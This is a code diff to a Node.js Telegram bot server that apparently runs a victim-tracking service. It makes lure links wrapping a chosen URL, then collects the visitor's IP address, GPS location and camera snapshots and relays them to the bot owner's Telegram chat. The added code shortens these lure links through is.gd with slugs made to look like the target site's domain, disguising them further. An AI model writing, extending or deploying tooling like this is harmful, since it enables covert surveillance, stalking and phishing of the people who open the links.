@@ -19,7 +19,84 @@ var hostURL="https://trackdown-ltxg.onrender.com";
 //TOGGLE for Shorters
 var use1pt=true;
 
+// Function to create custom is.gd short link
+async function createIsGdShortLink(longUrl, customSlug) {
+    try {
+        // First, try to create with custom slug
+        let apiUrl = `https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}&shorturl=${encodeURIComponent(customSlug)}`;
+        
+        const response = await fetch(apiUrl);
+        const result = await response.text();
+        
+        // Check if the response contains an error
+        if (result.startsWith('Error:')) {
+            console.log(`is.gd error with custom slug: ${result}`);
+            return null;
+        }
+        
+        return result;
+    } catch (error) {
+        console.error('is.gd shortening error:', error);
+        return null;
+    }
+}
 
+// Function to generate custom slug from URL
+function generateCustomSlugFromUrl(url) {
+    try {
+        // Remove protocol
+        let domain = url.replace(/^https?:\/\//i, '');
+        // Remove www if present
+        domain = domain.replace(/^www\./i, '');
+        // Remove path and query parameters
+        domain = domain.split('/')[0];
+        // Replace dots with underscores (is.gd allows letters, numbers, underscores)
+        domain = domain.replace(/\./g, '_');
+        // Remove any other invalid characters
+        domain = domain.replace(/[^a-zA-Z0-9_]/g, '');
+        // Limit length (is.gd max is 30 characters)
+        domain = domain.substring(0, 30);
+        return domain;
+    } catch (error) {
+        return null;
+    }
+}
+
+// Function to create both short links (they will be different since URLs are different)
+async function createBothShortLinks(cUrl, wUrl, baseSlug) {
+    let cShortUrl = null;
+    let wShortUrl = null;
+    
+    // Try different variations for cloudflare and webview
+    // is.gd needs unique slugs for different URLs, so we'll try different patterns
+    
+    // Try for cloudflare link
+    let attempt = 0;
+    while (!cShortUrl && attempt < 3) {
+        let slugAttempt = baseSlug;
+        if (attempt === 1) slugAttempt = baseSlug + "1";
+        if (attempt === 2) slugAttempt = baseSlug + "2";
+        
+        cShortUrl = await createIsGdShortLink(cUrl, slugAttempt);
+        if (!cShortUrl) attempt++;
+        else break;
+    }
+    
+    // Try for webview link (must be different from cloudflare slug)
+    attempt = 0;
+    while (!wShortUrl && attempt < 3) {
+        let slugAttempt = baseSlug;
+        if (attempt === 0) slugAttempt = baseSlug + "web";
+        if (attempt === 1) slugAttempt = baseSlug + "view";
+        if (attempt === 2) slugAttempt = baseSlug + "page";
+        
+        wShortUrl = await createIsGdShortLink(wUrl, slugAttempt);
+        if (!wShortUrl) attempt++;
+        else break;
+    }
+    
+    return { cShortUrl, wShortUrl };
+}
 
 app.get("/w/:path/:uri",(req,res)=>{
 var ip;
@@ -102,56 +179,69 @@ bot.on('polling_error', (error) => {
 //console.log(error.code); 
 });
 
+async function createLink(cid, msg) {
+    var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
 
+    if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
+        var url = cid.toString(36) + '/' + btoa(msg);
+        var m = {
+            reply_markup: JSON.stringify({
+                "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]]
+            })
+        };
 
+        var cUrl = `${hostURL}/c/${url}`;
+        var wUrl = `${hostURL}/w/${url}`;
 
-
-
-async function createLink(cid,msg){
-
-var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
-
-if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
- 
-var url=cid.toString(36)+'/'+btoa(msg);
-var m={
-  reply_markup:JSON.stringify({
-    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
-  } )
-};
-
-var cUrl=`${hostURL}/c/${url}`;
-var wUrl=`${hostURL}/w/${url}`;
-  
-bot.sendChatAction(cid,"typing");
-if(use1pt){
-var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
-var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
-
-var f="",g="";
-
-for(var c in x){
-f+=x[c]+"\n";
+        bot.sendChatAction(cid, "typing");
+        
+        if (use1pt) {
+            // Generate custom slug from the original URL
+            const baseSlug = generateCustomSlugFromUrl(msg);
+            
+            let cShortUrl = null;
+            let wShortUrl = null;
+            
+            if (baseSlug) {
+                // Try to create both short links with custom slugs
+                const results = await createBothShortLinks(cUrl, wUrl, baseSlug);
+                cShortUrl = results.cShortUrl;
+                wShortUrl = results.wShortUrl;
+            }
+            
+            // If custom slug failed for any link, try without custom slug
+            if (!cShortUrl) {
+                cShortUrl = await createIsGdShortLink(cUrl, null);
+            }
+            
+            if (!wShortUrl) {
+                wShortUrl = await createIsGdShortLink(wUrl, null);
+            }
+            
+            // Format the response
+            let response = `New links has been created successfully. You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n`;
+            
+            if (cShortUrl) {
+                response += `🌐 CloudFlare Page Link\n${cShortUrl}\n\n`;
+            } else {
+                response += `🌐 CloudFlare Page Link\nFailed to shorten (using original):\n${cUrl}\n\n`;
+            }
+            
+            if (wShortUrl) {
+                response += `🌐 WebView Page Link\n${wShortUrl}\n\n`;
+            } else {
+                response += `🌐 WebView Page Link\nFailed to shorten (using original):\n${wUrl}\n\n`;
+            }
+            
+            bot.sendMessage(cid, response, m);
+        } else {
+            bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
+        }
+    } else {
+        bot.sendMessage(cid, `⚠️ Please Enter a valid URL , including http or https.`);
+        createNew(cid);
+    }
 }
-
-for(var c in y){
-g+=y[c]+"\n";
-}
-  
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
-}
-else{
-
-bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
-}
-}
-else{
-bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
-createNew(cid);
-
-}  
-}
-
 
 function createNew(cid){
 var mk={
@@ -160,75 +250,50 @@ reply_markup:JSON.stringify({"force_reply":true})
 bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
 }
 
-
-
-
-
 app.get("/", (req, res) => {
 var ip;
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
 res.json({"ip":ip});
-
-  
 });
 
-
 app.post("/location",(req,res)=>{
-
-  
 var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
 var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
 var uid=decodeURIComponent(req.body.uid) || null;
 var acc=decodeURIComponent(req.body.acc) || null;
 if(lon != null && lat != null && uid != null && acc != null){
-
 bot.sendLocation(parseInt(uid,36),lat,lon);
-
 bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
-  
 res.send("Done");
 }
 });
 
-
 app.post("/",(req,res)=>{
-
 var uid=decodeURIComponent(req.body.uid) || null;
 var data=decodeURIComponent(req.body.data)  || null;
-
 var ip;
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
   
 if( uid != null && data != null){
-
- 
 if(data.indexOf(ip) < 0){
 return res.send("ok");
 }
-
 data=data.replaceAll("<br>","\n");
-
 bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});
-
-  
 res.send("Done");
 }
 });
-
 
 app.post("/camsnap",(req,res)=>{
 var uid=decodeURIComponent(req.body.uid)  || null;
 var img=decodeURIComponent(req.body.img) || null;
   
 if( uid != null && img != null){
-  
 var buffer=Buffer.from(img,'base64');
-  
 var info={
 filename:"camsnap.png",
 contentType: 'image/png'
 };
-
 
 try {
 bot.sendPhoto(parseInt(uid,36),buffer,{},info);
@@ -236,14 +301,9 @@ bot.sendPhoto(parseInt(uid,36),buffer,{},info);
 console.log(error);
 }
 
-
 res.send("Done");
- 
 }
-
 });
-
-
 
 app.listen(5000, () => {
 console.log("App Running on Port 5000!");
